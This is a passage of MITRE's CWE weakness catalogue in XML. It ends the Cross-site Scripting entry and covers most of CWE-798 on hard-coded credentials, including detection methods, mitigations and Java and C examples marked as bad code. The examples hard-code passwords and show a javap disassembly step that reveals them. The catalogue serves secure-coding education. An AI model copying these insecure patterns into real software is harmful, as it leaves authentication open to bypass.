               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Cross-site scripting (XSS)</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Cross-site Scripting</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Cross-site scripting</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Cross Site Scripting (XSS)</Mapped_Node_Name>
               <Mapped_Node_ID>A1</Mapped_Node_ID>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Unvalidated Input</Mapped_Node_Name>
               <Mapped_Node_ID>A1</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Cross-Site Scripting (XSS) Flaws</Mapped_Node_Name>
               <Mapped_Node_ID>A4</Mapped_Node_ID>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Cross-site Scripting </Mapped_Node_Name>
               <Mapped_Node_ID>8</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Tainted input to command</Mapped_Node_Name>
               <Mapped_Node_ID>SFP24</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>106</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>18</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>19</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>198</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>199</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>209</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>243</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>244</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>245</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>246</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>247</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>32</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>63</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>85</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>86</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>91</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms,
						Background_Details, Common_Consequences, Description, Relationships,
						Other_Notes, References, Taxonomy_Mappings,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms,
						Background_Details, Common_Consequences, Demonstrative_Examples,
						Description, Detection_Factors, Enabling_Factors_for_Exploitation, Name,
						Observed_Examples, Other_Notes, Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description,
						Detection_Factors, Enabling_Factors_for_Exploitation,
						Observed_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors,
						Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Name,
						Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Detection_Factors,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">Cross-site Scripting
						(XSS)</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Failure to Sanitize
						Directives in a Web Page (aka 'Cross-site scripting'
						(XSS))</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-05-27">Failure to Preserve Web Page
						Structure (aka 'Cross-site Scripting')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2010-06-21">Failure to Preserve Web Page
						Structure ('Cross-site Scripting')</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="798" Name="Use of Hard-coded Credentials" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software contains hard-coded credentials, such as a
					password or cryptographic key, which it uses for its own inbound authentication,
					outbound communication to external components, or encryption of internal
					data.</Description_Summary>
            <Extended_Description>
               <Text>Hard-coded credentials typically create a significant hole that allows an
						attacker to bypass the authentication that has been configured by the
						software administrator. This hole might be difficult for the system
						administrator to detect. Even if detected, it can be difficult to fix, so
						the administrator may be forced into disabling the product entirely. There
						are two main variations:</Text>
               <Block>
                  <Text>Inbound: the software contains an authentication mechanism that checks
							the input credentials against a hard-coded set of credentials.</Text>
                  <Text>Outbound: the software connects to another system or component, and it
							contains hard-coded credentials for connecting to that component.</Text>
               </Block>
               <Text>In the Inbound variant, a default administration account is created, and a
						simple password is hard-coded into the product and associated with that
						account. This hard-coded password is the same for each installation of the
						product, and it usually cannot be changed or disabled by system
						administrators without manually modifying the program, or otherwise patching
						the software. If the password is ever discovered or published (a common
						occurrence on the Internet), then anybody with knowledge of this password
						can access the product. Finally, since all installations of the software
						will have the same password, even across different organizations, this
						enables massive attacks such as worms to take place.</Text>
               <Text>The Outbound variant applies to front-end systems that authenticate with a
						back-end service. The back-end service may require a fixed password which
						can be easily discovered. The programmer may simply hard-code those back-end
						credentials into the front-end software. Any user of that program may be
						able to extract the password. Client-side systems with hard-coded passwords
						pose even more of a threat, since the extraction of a password from a binary
						is usually very simple.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>803</Relationship_Target_ID>
               <!--2010 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>255</Relationship_Target_ID>
               <!--Credentials Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>287</Relationship_Target_ID>
               <!--Improper Authentication--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>344</Relationship_Target_ID>
               <!--Use of Invariant Value in Dynamically Changing Context--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>671</Relationship_Target_ID>
               <!--Lack of Administrator Control over Security--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>724</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A3 - Broken Authentication and Session Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>257</Relationship_Target_ID>
               <!--Storing Passwords in a Recoverable Format--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>254</Relationship_Target_ID>
               <!--Security Features--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>753</Relationship_Target_ID>
               <!--2009 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>861</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 49 - Miscellaneous (MSC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>812</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A3 - Broken Authentication and Session Management--></Relationship>
         </Relationships>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Mobile Application"/>
            </Architectural_Paradigms>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If hard-coded passwords are used, it is almost certain that malicious
							users will gain access to the account in question.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Other</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>This weakness can lead to the exposure of resources or functionality
							to unintended actors, possibly providing attackers with sensitive
							information or even execute arbitrary code.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Credential storage in configuration files is findable using black box
							methods, but the use of hard-coded credentials for an incoming
							authentication routine typically involves an account that is not visible
							outside of the code.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated white box techniques have been published for detecting
							hard-coded credentials for incoming authentication, but there is some
							expert disagreement regarding their effectiveness and applicability to a
							broad range of methods.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness may be detectable using manual code analysis. Unless
							authentication is decentralized and applied throughout the software,
							there can be sufficient time for the analyst to find incoming
							authentication routines and examine the program logic looking for usage
							of hard-coded credentials. Configuration files could also be
							analyzed.</Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>For hard-coded credentials in incoming authentication: use monitoring
							tools that examine the software's process as it interacts with the
							operating system and the network. This technique is useful in cases when
							source code is unavailable, if the software was not developed by you, or
							if you want to verify that the build phase did not introduce any new
							weaknesses. Examples include debuggers that directly attach to the
							running process; system-call tracing utilities such as truss (Solaris)
							and strace (Linux); system activity monitors such as FileMon, RegMon,
							Process Monitor, and other Sysinternals utilities (Windows); and
							sniffers and protocol analyzers that monitor network traffic.</Text>
                  <Text>Attach the monitor to the process and perform a login. Using call
							trees or similar artifacts from the output, examine the associated
							behaviors and see if any of them appear to be comparing the input to a
							fixed string or value. </Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Network Sniffer</Text>
                        <Text>Forced Path Execution</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Configuration Checker</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For outbound authentication: store passwords, keys, and other
							credentials outside of the code in a strongly-protected, encrypted
							configuration file or database that is protected from access by all
							outsiders, including other local users on the same system. Properly
							protect the key (CWE-320). If you cannot use encryption to protect the
							file, then make sure that the permissions are as restrictive as possible
							[R.798.1].</Text>
                  <Text>In Windows environments, the Encrypted File System (EFS) may provide
							some protection.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For inbound authentication: Rather than hard-code a default username
							and password, key, or other authentication credentials for first time
							logins, utilize a "first login" mode that requires the user to enter a
							unique strong password or key.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If the software must contain hard-coded credentials or they cannot be
							removed, perform access control checks and limit which entities can
							access the feature that requires the hard-coded credentials. For
							example, a feature might only be enabled through the system console
							instead of through a network connection.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For inbound authentication using passwords: apply strong one-way
							hashes to passwords and store those hashes in a configuration file or
							database with appropriate access control. That way, theft of the
							file/database still requires the attacker to try to crack the password.
							When handling an incoming password during authentication, take the hash
							of the password and compare it to the saved hash.</Text>
                  <Text>Use randomly assigned salts for each separate hash that is generated.
							This increases the amount of computation that an attacker needs to
							conduct a brute-force attack, possibly limiting the effectiveness of the
							rainbow table method.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For front-end to back-end connections: Three solutions are possible,
							although none are complete.</Text>
                  <Block Block_Nature="List">
                     <Text>The first suggestion involves the use of generated passwords or
								keys that are changed automatically and must be entered at given
								time intervals by a system administrator. These passwords will be
								held in memory and only be valid for the time intervals.</Text>
                     <Text>Next, the passwords or keys should be limited at the back end to
								only performing actions valid for the front end, as opposed to
								having full access.</Text>
                     <Text>Finally, the messages sent should be tagged and checksummed with
								time sensitive values so as to prevent replay-style attacks.</Text>
                  </Block>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Explicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-13">
               <Intro_Text>The following code uses a hard-coded password to connect to a
						database:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>...</Code>
                     <Code>DriverManager.getConnection(url, "scott", "tiger");</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>This is an example of an external hard-coded password on the
							client-side of a connection. This code will run successfully, but anyone
							who has access to it will have access to the password. Once the program
							has shipped, there is no going back from the database user "scott" with
							a password of "tiger" unless the program is patched. A devious employee
							with access to this information can use it to break into the system.
							Even worse, if attackers have access to the bytecode for application,
							they can use the javap -c command to access the disassembled code, which
							will contain the values of the passwords used. The result of this
							operation might look something like the following for the example
							above:</Text>
                  <Block Block_Nature="Attack">
                     <Code>javap -c ConnMngr.class</Code>
                     <Block>
                        <Code>22: ldc #36; //String jdbc:mysql://ixne.com/rxsql</Code>
                        <Code>24: ldc #38; //String scott</Code>
                        <Code>26: ldc #17; //String tiger</Code>
                     </Block>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-14">
               <Intro_Text>The following code is an example of an internal hard-coded password
						in the back-end:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>int VerifyAdmin(char *password) {</Code>
                     <Block>
                        <Code>if (strcmp(password, "Mew!")) {</Code>
                        <Block>
                           <Code/>
                           <Code>printf("Incorrect Password!\n");</Code>
                           <Code>return(0)</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>printf("Entering Diagnostic Mode...\n");</Code>
                        <Code>return(1);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>int VerifyAdmin(String password) {</Code>
                     <Block>
                        <Code>if (passwd.Equals("Mew!")) {</Code>
                        <Block>
                           <Code>return(0)</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>//Diagnostic Mode</Code>
                        <Code>return(1);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>Every instance of this program can be placed into diagnostic mode with
							the same password. Even worse is the fact that if this program is
							distributed as a binary-only distribution, it is very difficult to
							change that password or disable this "functionality."</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-92">
               <Intro_Text>The following code examples attempt to verify a password using a
						hard-coded cryptographic key.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>int VerifyAdmin(char *password) {</Code>
                     <Block>
                        <Code>if (strcmp(password,"68af404b513073584c4b6f22b6c63e6b"))
									{</Code>
                        <Block>
                           <Code/>
                           <Code>printf("Incorrect Password!\n");</Code>
                           <Code>return(0);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>printf("Entering Diagnostic Mode...\n");</Code>
                        <Code>return(1);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
